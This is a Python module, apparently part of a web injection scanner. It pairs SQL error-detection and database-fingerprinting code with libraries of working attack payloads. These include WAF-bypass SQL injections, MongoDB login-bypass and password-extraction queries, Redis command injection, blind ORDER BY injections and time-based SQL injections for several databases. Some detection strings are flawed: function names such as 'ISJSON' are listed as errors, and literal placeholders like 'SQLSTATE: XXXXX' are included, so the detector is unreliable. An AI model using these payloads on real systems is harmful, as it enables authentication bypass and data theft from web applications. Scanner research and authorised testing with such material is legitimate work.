"""
SQL error patterns - AWVS10 base + 2018-2025 updates.
90+ plain-text patterns + regex covering all major DBs + NoSQL.
Updated: MariaDB, CockroachDB, CQL, cloud SQL, JSON WAF bypasses, NoSQL.
"""
import re

MYSQL_ERRORS = [
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "Warning: mysqli_",
    "MySqlException",
    "valid MySQL result",
    "MySqlClient.",
    "com.mysql.jdbc",
    "Syntax error or access violation",
    "SQLSTATE[HY",
    "MySQL server version for the right syntax",
]

MARIADB_ERRORS = [
    "check the manual that corresponds to your MariaDB server version",
    "MariaDB server version for the right syntax",
    "SQLSTATE[42000]",
]

MSSQL_ERRORS = [
    "Driver][SQL Server]",
    "Unclosed quotation mark after the character string",
    "ODBC SQL Server Driver",
    "SQLServer JDBC Driver",
    "macabortar",
    "SqlException",
    "com.microsoft.sqlserver.jdbc",
    "Incorrect syntax near",
    "Msg 170, Level 15, State",
    "Microsoft SQL Native Client error",
    "ODBC Driver][SQL Server]",
    "SQL Server][ODBC",
    "SQLServer JDBC Driver]",
    "com.jnetdirect.jsql",
    "Unclosed quotation mark",
    "ISJSON",
]

POSTGRESQL_ERRORS = [
    "PostgreSQL query failed",
    "Warning: pg_",
    "valid PostgreSQL result",
    "Npgsql.",
    "PG::SyntaxError",
    "org.postgresql.util.PSQLException",
    "ERROR:  syntax error at or near",
    "ERROR: parser: parse error at or near",
    "PostgreSQL.*ERROR",
    "PSQLException",
    "json_typeof",
]

ORACLE_ERRORS = [
    "ORA-00933",
    "ORA-06512",
    "ORA-00936",
    "ORA-00921",
    "ORA-01756",
    "quoted string not properly terminated",
    "SQL command not properly ended",
    "Oracle error",
    "Oracle.*Driver",
    "oracle.jdbc",
    "OracleException",
]

SQLITE_ERRORS = [
    "SQLite/JDBCDriver",
    "SQLite.Exception",
    "System.Data.SQLite.SQLiteException",
    "Warning: SQLite3::",
    "SQLITE_ERROR",
    "[SQLITE_ERROR]",
    "SQLite3::query",
    "SQLite3::SQLException",
    "unrecognized token:",
    "json_extract",
]

DB2_ERRORS = [
    "CLI Driver][DB2",
    "DB2 SQL error",
    "db2_",
    "SQLCODE",
    "SQLSTATE",
]

INFORMIX_ERRORS = [
    "IfxException",
    "com.informix.jdbc",
    "SQLCODE=-",
]

COCKROACHDB_ERRORS = [
    "ERROR: <message> SQLSTATE:",
    "SQLSTATE: XXXXX",
    "kv/kvserver",
    "cockroach",
]

CASSANDRA_CQL_ERRORS = [
    "InvalidRequest: Error from server: code=2200",
    "SyntaxException: line",
    "no viable alternative at input",
    "InvalidQueryException",
    "com.datastax.driver",
]

GENERIC_ERRORS = [
    "SQL syntax.*error",
    "Warning.*\\Wmysql_",
    "Warning.*\\Wmysqli_",
    "Warning.*\\Wpg_",
    "Syntax error.*in query expression",
    "Data type mismatch in criteria expression",
    "A Database Error Occurred",
    "ADODB.Field error",
    "ADODB.Command",
    "JET Database Engine",
    "Access Database Engine",
    "Hibernate",
    "javax.persistence",
    "HibernateException",
    "SQLSTATE\\[\\d+\\]",
    "PDOException",
    "Doctrine.*Exception",
    "Sequelize.*Error",
    "TypeORM.*error",
]

ALL_PLAIN_PATTERNS = (
    MYSQL_ERRORS
    + MARIADB_ERRORS
    + MSSQL_ERRORS
    + POSTGRESQL_ERRORS
    + ORACLE_ERRORS
    + SQLITE_ERRORS
    + DB2_ERRORS
    + INFORMIX_ERRORS
    + COCKROACHDB_ERRORS
    + CASSANDRA_CQL_ERRORS
)

REGEX_PATTERNS = [re.compile(p, re.IGNORECASE) for p in GENERIC_ERRORS]


def detect_sql_error(response_body: str) -> tuple[bool, str]:
    body_lower = response_body.lower()
    for pattern in ALL_PLAIN_PATTERNS:
        if pattern.lower() in body_lower:
            return True, pattern
    for regex in REGEX_PATTERNS:
        if regex.search(response_body):
            return True, regex.pattern
    return False, ""


DB_FINGERPRINTS = {
    "mysql": [
        "You have an error in your SQL syntax",
        "Warning: mysql_",
        "MySqlException",
    ],
    "mariadb": [
        "MariaDB server version",
        "corresponds to your MariaDB",
    ],
    "mssql": [
        "Driver][SQL Server]",
        "Unclosed quotation mark",
        "Incorrect syntax near",
    ],
    "postgresql": [
        "PostgreSQL query failed",
        "PG::SyntaxError",
        "PSQLException",
    ],
    "oracle": [
        "ORA-00933",
        "ORA-06512",
        "quoted string not properly terminated",
    ],
    "sqlite": [
        "SQLite",
        "SQLITE_ERROR",
        "unrecognized token",
    ],
    "cockroachdb": [
        "cockroach",
        "kv/kvserver",
    ],
    "cassandra": [
        "InvalidRequest: Error from server",
        "SyntaxException",
        "com.datastax",
    ],
}


def fingerprint_db(response_body: str) -> str:
    body_lower = response_body.lower()
    for db_name, patterns in DB_FINGERPRINTS.items():
        for p in patterns:
            if p.lower() in body_lower:
                return db_name
    return "unknown"


# --- WAF BYPASS PAYLOADS (2022-2023 JSON-based, Team82/Claroty research) ---

WAF_BYPASS_PAYLOADS = {
    "json_mysql": [
        "' OR JSON_CONTAINS('{\"a\":1}', '1', '$.a')-- -",
        "' OR JSON_EXTRACT('{\"a\":1}', '$.a')=1-- -",
        "' OR JSON_MERGE('[1,2]','[true,false]')-- -",
    ],
    "json_postgresql": [
        "' OR json_typeof('1'::json)='number'-- -",
    ],
    "json_sqlite": [
        "' OR json_extract('{\"a\":1}','$.a')=1-- -",
    ],
    "json_mssql": [
        "' OR ISJSON('{\"a\":1}')=1-- -",
    ],
    "comment_fragment": [
        "1+un/**/ion+se/**/lect+1,2,3--",
        "/*!50000UNION*//*!50000SELECT*/1,2,3",
        "1'/**/OR/**/1=1--",
    ],
    "space_replace": [
        "1'%09OR%091=1--",
        "1'%0aOR%0a1=1--",
        "1'%0bOR%0b1=1--",
        "1'%0cOR%0c1=1--",
        "1'%a0OR%a01=1--",
    ],
    "double_encode": [
        "%2527",
        "%252f",
        "%2522",
    ],
    "unicode_fullwidth": [
        "%ef%bc%87",
        "%ef%bc%82",
    ],
}

# --- NOSQL INJECTION PATTERNS ---

NOSQL_MONGODB_AUTH_BYPASS = [
    ('{"username": {"$ne": ""}, "password": {"$ne": ""}}', "json"),
    ('{"username": {"$gt": ""}, "password": {"$gt": ""}}', "json"),
    ('{"username": {"$in": ["admin","root"]}, "password": {"$ne": "x"}}', "json"),
    ("username=admin&password[$ne]=anything", "urlencoded"),
    ("username[$ne]=x&password[$ne]=x", "urlencoded"),
    ("username=admin&password[$regex]=.*", "urlencoded"),
    ("username=admin&password[$gt]=", "urlencoded"),
]

NOSQL_MONGODB_EXTRACTION = [
    '{"username": "admin", "password": {"$regex": "^{char}"}}',
    '{"$where": "this.password.match(/^{char}/) != null"}',
    '{"$where": "sleep(5000)"}',
]

NOSQL_REDIS = [
    "\\r\\nSET injected_key injected_value\\r\\n",
    'EVAL "redis.call(\'SET\',\'x\',\'pwned\')" 0',
]

NOSQL_ELASTICSEARCH = [
    '{"query": {"match_all": {}}}',
    '" OR "_exists_":password',
]

# --- BLIND SQLI FOR ORDER BY / LIMIT ---

ORDER_BY_BLIND = {
    "postgresql": [
        "ORDER BY (CASE WHEN ({cond}) THEN 1 ELSE (SELECT 1/(SELECT 0)) END)",
    ],
    "mysql": [
        "ORDER BY IF(({cond}),1,(SELECT 1 FROM information_schema.tables))",
    ],
    "mysql_limit": [
        "LIMIT 1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,({expr}))))",
    ],
    "generic": [
        "ORDER BY (CASE WHEN ({cond}) THEN 1 ELSE 2 END)",
    ],
}

# --- TIME-BASED PAYLOADS (expanded) ---

TIME_PAYLOADS_EXTENDED = {
    "mysql": [
        ("' AND IF(1=1,SLEEP({t}),0)-- -", "sleep"),
        ("' OR BENCHMARK(10000000,SHA1('test'))-- -", "benchmark"),
    ],
    "postgresql": [
        ("' OR (SELECT 4564 FROM PG_SLEEP({t}))-- -", "pg_sleep"),
        ("' || (SELECT pg_sleep({t}))--", "pg_sleep"),
    ],
    "mssql": [
        ("'; IF (SUBSTRING(@@VERSION,1,1)='M') WAITFOR DELAY '0:0:{t}'--", "waitfor"),
    ],
    "oracle": [
        ("' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{t})--", "dbms_pipe"),
    ],
    "sqlite": [
        ("' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--", "randomblob"),
    ],
}
